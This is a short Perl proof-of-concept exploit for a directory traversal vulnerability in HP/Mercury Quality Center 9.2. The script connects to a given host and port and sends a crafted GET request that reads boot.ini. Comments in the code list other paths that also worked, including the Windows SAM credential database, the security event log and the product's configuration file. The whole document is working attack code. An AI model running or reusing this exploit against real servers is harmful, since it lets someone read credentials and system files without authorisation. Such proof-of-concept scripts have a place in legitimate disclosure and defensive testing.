#!/usr/bin/env perl
#########################
# POC directory traversal exploit for HP/Mercury Quality Center 9.2
# author: Chuck Little
#########################
use IO::Socket;

print "\n[HP Directory Traversal Proof of Concept]\n\n";

my $IP = shift or &Usage;
my $Port = shift or &Usage;
my $DIRTRAVERSE = "/..\\..\\..\\..\\..\\..\\..\\..\\boot.ini";
####
# Other examples that succeeded. -CL
#  "/..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\SYSTEM32\\config\\SAM"
#  "/..\\..\\..\\..\\..\\..\\..\\..\\WINDOWS\\SYSTEM32\\config\\SecEvent.evt"
#  "/..\\..\\..\\..\\..\\..\\..\\..\\Program%20Files\\Mercury\\Quality%20Center\\conf\\QCConfigFile.properties"
####

print "[+] Connecting to $IP on port $Port.\n";
print "[+] Retrieving $DIRTRAVERSE\n\n";
my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp") or die "Unable to connect.\n";
print "[+] Sending Payload...\n";
    print $Socket "GET $DIRTRAVERSE HTTP/1.1\r\n";
    print $Socket "Accept: */*\r\n";
    print $Socket "Host: $IP\r\n";
    print $Socket "\r\n\r\n";
    my @Response = <$Socket>;
    sleep 3;
    print "@Response\n";
    close $Socket;
exit 0;

sub Usage {
    print "Proper Usage:\n\t$0 [HOST/IP] [PORT]\n\n";
    exit 0;
}

